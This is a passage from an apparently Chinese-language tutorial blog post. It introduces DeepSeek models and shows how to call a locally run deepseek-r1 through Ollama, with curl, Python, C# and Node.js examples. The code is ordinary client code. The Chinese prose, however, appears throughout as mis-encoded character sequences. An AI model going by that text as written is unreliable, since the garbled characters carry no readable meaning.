æœˆå‘å¸ƒï¼Œæ“…é•¿é€»è¾‘æ¨ç†ã€æ•°å­¦æ¨ç†å’Œå®æ—¶é—®é¢˜è§£å†³ï¼Œåœ¨ä¸€äº›åŸºå‡†æµ‹è¯•ä¸­å£°ç§°è¶…è¶Šäº† OpenAI O1ï¼Œä½†ä¹Ÿæœ‰æµ‹è¯•æ˜¾ç¤ºå­˜åœ¨é€Ÿåº¦ç­‰æ–¹é¢çš„æŒ‘æˆ˜ã€‚<br>DeepSeek V3ï¼š2024 å¹´ 12 æœˆå‘å¸ƒï¼Œæ‹¥æœ‰ 6710 äº¿å‚æ•°ï¼Œè®­ç»ƒä»…èŠ±è´¹ 558 ä¸‡ç¾å…ƒï¼Œçº¦ 55 å¤©æ—¶é—´ï¼Œåœ¨åŸºå‡†æµ‹è¯•ä¸­æ€§èƒ½ä¼˜äº Llama 3.1 å’Œ Qwen 2.5ï¼Œä¸ GPT-4 O å’Œ Claude 3.5 Sonnet ç›¸å½“ã€‚<br>DeepSeek R1 å’Œ DeepSeek R1-zeroï¼š2025 å¹´ 1 æœˆå‘å¸ƒï¼ŒR1 æ¨¡å‹æ˜¯å¼€æºçš„ï¼Œå¯è®©ä»»ä½•å¼€å‘è€…ä½¿ç”¨ï¼Œåœ¨ä¸€äº›å…³é”®çš„æ•°å­¦å’Œç¼–ç¨‹æµ‹è¯•ä¸­è¡¨ç°å‡ºè‰²ï¼Œèƒ½ä¸ OpenAI çš„å…ˆè¿›æ¨¡å‹ç›¸åª²ç¾æˆ–è¶…è¶Šã€‚<br><strong>å·¥å…·å±‚é¢</strong>DeepSeek ä½œä¸º AI å·¥å…·ï¼Œå…·æœ‰å¼ºå¤§çš„è‡ªç„¶è¯­è¨€å¤„ç†èƒ½åŠ›ï¼Œå¯è¿›è¡ŒçŸ¥è¯†é—®ç­”ã€æ–‡æœ¬ç”Ÿæˆã€æ•°æ®åˆ†æã€ä»£ç ç¼–å†™ç­‰å¤šç§ä»»åŠ¡ï¼Œè¿˜æ”¯æŒå¤šæ¨¡æ€è¾“å…¥å’Œè”ç½‘æœç´¢ï¼Œèƒ½å®æ—¶è·å–æœ€æ–°ä¿¡æ¯ã€‚å¹¿æ³›åº”ç”¨äºæ•™è‚²ã€ç¼–ç¨‹ã€å†…å®¹åˆ›ä½œã€æ™ºèƒ½å®¢æœç­‰é¢†åŸŸï¼Œä¸ºç”¨æˆ·æä¾›é«˜æ•ˆã€æ™ºèƒ½çš„è§£å†³æ–¹æ¡ˆã€‚</p><p>DeepSeekçš„å®˜æ–¹ç½‘ç«™åœ°å€ <a class="link"   href="https://www.deepseek.com/" >https://www.deepseek.com/<i class="fas fa-external-link-alt"></i></a><br>APP <a class="link"   href="https://download.deepseek.com/app/" >https://download.deepseek.com/app/<i class="fas fa-external-link-alt"></i></a><br>WebUI <a class="link"   href="https://chat.deepseek.com/" >https://chat.deepseek.com/<i class="fas fa-external-link-alt"></i></a><br>APIæ–‡æ¡£ <a class="link"   href="https://api-docs.deepseek.com/zh-cn/" >https://api-docs.deepseek.com/zh-cn/<i class="fas fa-external-link-alt"></i></a></p><p>æœåŠ¡çŠ¶æ€ <a class="link"   href="https://status.deepseek.com/" >https://status.deepseek.com/<i class="fas fa-external-link-alt"></i></a></p><h1 id="æœ¬åœ°è¿è¡Œ"><a href="#æœ¬åœ°è¿è¡Œ" class="headerlink" title="æœ¬åœ°è¿è¡Œ"></a>æœ¬åœ°è¿è¡Œ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run deepseek-r1</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run deepseek-r1:1.5b</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:11434/api/generate -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;model&quot;: &quot;deepseek-r1:1.5b&quot;,</span></span><br><span class="line"><span class="string">  &quot;prompt&quot;: &quot;Why is the sky blue?&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><a class="link"   href="https://github.com/ollama/ollama/blob/main/docs/api.md" >https://github.com/ollama/ollama/blob/main/docs/api.md<i class="fas fa-external-link-alt"></i></a></p><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python</span><br><span class="line"><span class="comment"># Please install OpenAI SDK first: `pip3 install openai`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> openai <span class="keyword">import</span> OpenAI</span><br><span class="line"></span><br><span class="line">client = OpenAI(api_key=<span class="string">&quot;&lt;DeepSeek API Key&gt;&quot;</span>, base_url=<span class="string">&quot;https://api.deepseek.com&quot;</span>)</span><br><span class="line"></span><br><span class="line">response = client.chat.completions.create(</span><br><span class="line">    model=<span class="string">&quot;deepseek-chat&quot;</span>,</span><br><span class="line">    messages=[</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;You are a helpful assistant&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;Hello&quot;</span>&#125;,</span><br><span class="line">    ],</span><br><span class="line">    stream=<span class="literal">False</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.choices[<span class="number">0</span>].message.content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨æ„model&#x3D;â€™deepseek-chatâ€™è°ƒç”¨çš„æ˜¯DeepSeek-V3æ¨¡å‹ï¼Œmodel&#x3D;â€™deepseek-reasonerâ€™æ‰æ˜¯DeepSeek-R1å¤§æ¨¡å‹ã€‚</p><h1 id="csharp"><a href="#csharp" class="headerlink" title="csharp"></a>csharp</h1><p>è¦ä½¿ç”¨C#å¼€å‘ä¸€ä¸ªä¸Ollama APIè¿›è¡Œå¯¹è¯çš„ç¨‹åºï¼Œé¦–å…ˆéœ€è¦ç¡®ä¿å·²ç»å®‰è£…äº†Ollamaå¹¶ä¸”å®ƒæ­£åœ¨è¿è¡Œã€‚Ollamaé€šå¸¸ä¼šåœ¨æœ¬åœ°æä¾›ä¸€ä¸ªREST APIï¼Œå¯ä»¥é€šè¿‡HTTPè¯·æ±‚ä¸å®ƒè¿›è¡Œäº¤äº’ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„C#ç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•ä½¿ç”¨HttpClientä¸Ollama APIè¿›è¡Œäº¤äº’ï¼Œå¹¶è·å–æ¨¡å‹æ ‡ç­¾ï¼ˆå¦‚&#x2F;api&#x2F;tagsï¼‰ã€‚</p><h2 id="1-åˆ›å»ºC-æ§åˆ¶å°åº”ç”¨ç¨‹åº"><a href="#1-åˆ›å»ºC-æ§åˆ¶å°åº”ç”¨ç¨‹åº" class="headerlink" title="1. åˆ›å»ºC#æ§åˆ¶å°åº”ç”¨ç¨‹åº"></a>1. åˆ›å»ºC#æ§åˆ¶å°åº”ç”¨ç¨‹åº</h2><p>é¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„C#æ§åˆ¶å°åº”ç”¨ç¨‹åºé¡¹ç›®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dotnet new console -n OllamaChat</span><br><span class="line"><span class="built_in">cd</span> OllamaChat</span><br></pre></td></tr></table></figure><h2 id="2-æ·»åŠ å¿…è¦çš„NuGetåŒ…"><a href="#2-æ·»åŠ å¿…è¦çš„NuGetåŒ…" class="headerlink" title="2. æ·»åŠ å¿…è¦çš„NuGetåŒ…"></a>2. æ·»åŠ å¿…è¦çš„NuGetåŒ…</h2><p>éœ€è¦æ·»åŠ System.Net.HttpåŒ…æ¥å¤„ç†HTTPè¯·æ±‚ã€‚å¦‚æœä½¿ç”¨çš„æ˜¯.NET Core 3.1æˆ–æ›´é«˜ç‰ˆæœ¬ï¼ŒSystem.Net.Httpå·²ç»åŒ…å«åœ¨SDKä¸­ï¼Œæ— éœ€é¢å¤–å®‰è£…ã€‚</p><h2 id="3-ç¼–å†™ä»£ç "><a href="#3-ç¼–å†™ä»£ç " class="headerlink" title="3. ç¼–å†™ä»£ç "></a>3. ç¼–å†™ä»£ç </h2><p>åœ¨Program.csä¸­ç¼–å†™ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Net.Http;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Ollama APIçš„URL</span></span><br><span class="line">        <span class="built_in">string</span> ollamaApiUrl = <span class="string">&quot;http://localhost:11434/api/tags&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºHttpClientå®ä¾‹</span></span><br><span class="line">        <span class="keyword">using</span> (HttpClient client = <span class="keyword">new</span> HttpClient())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// å‘é€GETè¯·æ±‚è·å–æ¨¡å‹æ ‡ç­¾</span></span><br><span class="line">                HttpResponseMessage response = <span class="keyword">await</span> client.GetAsync(ollamaApiUrl);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// ç¡®ä¿è¯·æ±‚æˆåŠŸ</span></span><br><span class="line">                response.EnsureSuccessStatusCode();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// è¯»å–å“åº”å†…å®¹</span></span><br><span class="line">                <span class="built_in">string</span> responseBody = <span class="keyword">await</span> response.Content.ReadAsStringAsync();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// è¾“å‡ºå“åº”å†…å®¹</span></span><br><span class="line">                Console.WriteLine(<span class="string">&quot;Response from Ollama API:&quot;</span>);</span><br><span class="line">                Console.WriteLine(responseBody);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (HttpRequestException e)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// å¤„ç†è¯·æ±‚å¼‚å¸¸</span></span><br><span class="line">                Console.WriteLine(<span class="string">&quot;\nException Caught!&quot;</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;Message :&#123;0&#125; &quot;</span>, e.Message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-è¿è¡Œç¨‹åº"><a href="#4-è¿è¡Œç¨‹åº" class="headerlink" title="4. è¿è¡Œç¨‹åº"></a>4. è¿è¡Œç¨‹åº</h2><p>ç¡®ä¿Ollamaæ­£åœ¨è¿è¡Œï¼Œå¹¶ä¸”APIç«¯ç‚¹<a class="link"   href="http://localhost:11434/api/tags%E6%98%AF%E5%8F%AF%E8%AE%BF%E9%97%AE%E7%9A%84%E3%80%82%E7%84%B6%E5%90%8E%E8%BF%90%E8%A1%8C%E7%9A%84C#%E7%A8%8B%E5%BA%8F%EF%BC%9A" >http://localhost:11434/api/tagsæ˜¯å¯è®¿é—®çš„ã€‚ç„¶åè¿è¡Œçš„C#ç¨‹åºï¼š<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dotnet run</span><br></pre></td></tr></table></figure><h2 id="5-è§£é‡Šä»£ç "><a href="#5-è§£é‡Šä»£ç " class="headerlink" title="5. è§£é‡Šä»£ç "></a>5. è§£é‡Šä»£ç </h2><p>HttpClient: ç”¨äºå‘é€HTTPè¯·æ±‚å’Œæ¥æ”¶HTTPå“åº”ã€‚</p><p>GetAsync: å‘é€ä¸€ä¸ªGETè¯·æ±‚åˆ°æŒ‡å®šçš„URLã€‚</p><p>EnsureSuccessStatusCode: ç¡®ä¿HTTPå“åº”æ˜¯æˆåŠŸçš„ï¼ˆçŠ¶æ€ç 200-299ï¼‰ã€‚</p><p>ReadAsStringAsync: è¯»å–å“åº”å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚</p><p>Response from Ollama API:<br>{â€œmodelsâ€:[{â€œnameâ€:â€deepseek-r1:7bâ€,â€modelâ€:â€deepseek-r1:7bâ€,â€modified_atâ€:â€2025-02-04T62xxxxxxxx}}]}</p><h2 id="C-è°ƒç”¨-Ollama-API-è¿›è¡Œå¯¹è¯"><a href="#C-è°ƒç”¨-Ollama-API-è¿›è¡Œå¯¹è¯" class="headerlink" title="C# è°ƒç”¨ Ollama API è¿›è¡Œå¯¹è¯"></a>C# è°ƒç”¨ Ollama API è¿›è¡Œå¯¹è¯</h2><p>åŒ…æ‹¬è·å–æ¨¡å‹åˆ—è¡¨å’Œè¿›è¡Œå¯¹è¯ã€‚<br>ä½¿ç”¨ HttpClient å‘é€ HTTP è¯·æ±‚ï¼Œå¹¶è§£æè¿”å›çš„ JSON æ•°æ®ã€‚</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Net.Http;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Text.Json;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> <span class="built_in">string</span> BaseUrl = <span class="string">&quot;http://1.1.1.1:11434&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;è·å–å¯ç”¨æ¨¡å‹åˆ—è¡¨...&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> models = <span class="keyword">await</span> GetModelList();</span><br><span class="line">        Console.WriteLine(<span class="string">$&quot;æ¨¡å‹åˆ—è¡¨: <span class="subst">&#123;<span class="built_in">string</span>.Join(<span class="string">&quot;, &quot;</span>, models)&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (models.Length == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;æ²¡æœ‰å¯ç”¨çš„æ¨¡å‹ï¼&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> model = models[<span class="number">0</span>];  <span class="comment">// é€‰æ‹©ç¬¬ä¸€ä¸ªæ¨¡å‹</span></span><br><span class="line">        Console.WriteLine(<span class="string">$&quot;ä½¿ç”¨æ¨¡å‹: <span class="subst">&#123;model&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.Write(<span class="string">&quot;: &quot;</span>);</span><br><span class="line">            <span class="built_in">string</span> userInput = Console.ReadLine();</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrWhiteSpace(userInput)) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> response = <span class="keyword">await</span> ChatWithOllama(model, userInput);</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;Ollama: <span class="subst">&#123;response&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å¯ç”¨æ¨¡å‹åˆ—è¡¨</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">async</span> Task&lt;<span class="built_in">string</span>[]&gt; GetModelList()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">using</span> HttpClient client = <span class="keyword">new</span>();</span><br><span class="line">        HttpResponseMessage response = <span class="keyword">await</span> client.GetAsync(<span class="string">$&quot;<span class="subst">&#123;BaseUrl&#125;</span>/api/tags&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!response.IsSuccessStatusCode)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;è·å–æ¨¡å‹åˆ—è¡¨å¤±è´¥&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> Array.Empty&lt;<span class="built_in">string</span>&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> json = <span class="keyword">await</span> response.Content.ReadAsStringAsync();</span><br><span class="line">        <span class="keyword">using</span> JsonDocument doc = JsonDocument.Parse(json);</span><br><span class="line">        <span class="keyword">var</span> models = doc.RootElement.GetProperty(<span class="string">&quot;models&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">string</span>[] modelNames = <span class="keyword">new</span> <span class="built_in">string</span>[models.GetArrayLength()];</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; models.GetArrayLength(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            modelNames[i] = models[i].GetProperty(<span class="string">&quot;name&quot;</span>).GetString();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> modelNames;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‘é€å¯¹è¯è¯·æ±‚</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task&lt;<span class="built_in">string</span>&gt; <span class="title">ChatWithOllama</span>(<span class="params"><span class="built_in">string</span> model, <span class="built_in">string</span> prompt</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">using</span> HttpClient client = <span class="keyword">new</span>();</span><br><span class="line">        <span class="keyword">var</span> requestBody = <span class="keyword">new</span></span><br><span class="line">        &#123;</span><br><span class="line">            model = model,</span><br><span class="line">            prompt = prompt,</span><br><span class="line">            stream = <span class="literal">false</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> jsonRequest = JsonSerializer.Serialize(requestBody);</span><br><span class="line">        <span class="keyword">var</span> content = <span class="keyword">new</span> StringContent(jsonRequest, Encoding.UTF8, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HttpResponseMessage response = <span class="keyword">await</span> client.PostAsync(<span class="string">$&quot;<span class="subst">&#123;BaseUrl&#125;</span>/api/generate&quot;</span>, content);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!response.IsSuccessStatusCode)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;å¯¹è¯è¯·æ±‚å¤±è´¥&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> jsonResponse = <span class="keyword">await</span> response.Content.ReadAsStringAsync();</span><br><span class="line">        <span class="keyword">using</span> JsonDocument doc = JsonDocument.Parse(jsonResponse);</span><br><span class="line">        <span class="keyword">return</span> doc.RootElement.GetProperty(<span class="string">&quot;response&quot;</span>).GetString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å–æ¨¡å‹åˆ—è¡¨ (GetModelList):</p><p>å‘é€ GET è¯·æ±‚åˆ° <a class="link"   href="http://1.1.1.1:11434/api/tags" >http://1.1.1.1:11434/api/tags<i class="fas fa-external-link-alt"></i></a> è·å–æ¨¡å‹åˆ—è¡¨ã€‚<br>è§£æ JSON å“åº”ï¼Œæå–æ¨¡å‹åç§°ã€‚<br>è¿›è¡Œå¯¹è¯ (ChatWithOllama):</p><p>å‘é€ POST è¯·æ±‚åˆ° <a class="link"   href="http://1.1.1.1:11434/api/generate%E3%80%82" >http://1.1.1.1:11434/api/generateã€‚<i class="fas fa-external-link-alt"></i></a><br>è¯·æ±‚ä½“åŒ…å«ï¼š<br>model: é€‰æ‹©çš„æ¨¡å‹åç§°ã€‚<br>prompt: ç”¨æˆ·è¾“å…¥çš„é—®é¢˜ã€‚<br>stream: false: ç¦ç”¨æµå¼å“åº”ï¼Œç›´æ¥è¿”å›å®Œæ•´çš„ç»“æœã€‚<br><strong>äº¤äº’æ–¹å¼:</strong></p><p>å…ˆè·å–æ¨¡å‹åˆ—è¡¨ï¼Œé»˜è®¤é€‰æ‹©ç¬¬ä¸€ä¸ªæ¨¡å‹ã€‚<br>è¿›å…¥å¯¹è¯å¾ªç¯ï¼Œç”¨æˆ·è¾“å…¥æ–‡æœ¬åï¼Œç¨‹åºè°ƒç”¨ API è·å– AI å›å¤å¹¶æ‰“å°ã€‚</p><h2 id="è¿è¡Œç¤ºä¾‹ï¼š"><a href="#è¿è¡Œç¤ºä¾‹ï¼š" class="headerlink" title="è¿è¡Œç¤ºä¾‹ï¼š"></a>è¿è¡Œç¤ºä¾‹ï¼š</h2><dl><dt>è·å–å¯ç”¨æ¨¡å‹åˆ—è¡¨â€¦<br>æ¨¡å‹åˆ—è¡¨: llama3, gemma, mistral<br>ä½¿ç”¨æ¨¡å‹: llama3<br>: å¥½ï¼<br>Ollama: å¥½ï¼å¾ˆé«˜å…´è§åˆ°ã€‚</dt><dd>æ˜¯è°ï¼Ÿ<br>Ollama: æˆ‘æ˜¯ä¸€ä¸ª AI è¯­è¨€æ¨¡å‹ï¼Œå¯ä»¥å¸®åŠ©å›ç­”é—®é¢˜ã€‚</dd></dl><h1 id="nodejs-vue3"><a href="#nodejs-vue3" class="headerlink" title="nodejs  vue3"></a>nodejs  vue3</h1><p> Node.jsï¼ˆExpress + Vue 3ï¼‰å®ç°çš„å¯¹è¯ç½‘é¡µï¼Œæ”¯æŒé€‰æ‹©æ¨¡å‹å¹¶ä¸ Ollama è¿›è¡Œå¯¹è¯ã€‚</p><p>åç«¯ï¼ˆNode.js + Expressï¼‰ï¼šæä¾› API è·å–æ¨¡å‹åˆ—è¡¨ï¼Œå¹¶ä¸ Ollama è¿›è¡Œå¯¹è¯ã€‚<br>å‰ç«¯ï¼ˆVue 3 + Element Plusï¼‰ï¼šåˆ›å»ºç•Œé¢ï¼Œå…è®¸ç”¨æˆ·é€‰æ‹©æ¨¡å‹å¹¶è¿›è¡Œå¯¹è¯ã€‚</p><h2 id="åç«¯ï¼ˆNode-js-Expressï¼‰"><a href="#åç«¯ï¼ˆNode-js-Expressï¼‰" class="headerlink" title="åç«¯ï¼ˆNode.js + Expressï¼‰"></a>åç«¯ï¼ˆNode.js + Expressï¼‰</h2><p>å®‰è£…ä¾èµ–ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm init -y</span><br><span class="line">npm install express axios cors</span><br></pre></td></tr></table></figure><p>åˆ›å»º server.jsï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&quot;axios&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&quot;cors&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">OLLAMA_URL</span> = <span class="string">&quot;http://1.1.1.1:11434&quot;</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cors</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–å¯ç”¨æ¨¡å‹åˆ—è¡¨</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/api/models&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">`<span class="subst">$&#123;OLLAMA_URL&#125;</span>/api/tags`</span>);</span><br><span class="line">        res.<span class="title function_">json</span>(response.<span class="property">data</span>.<span 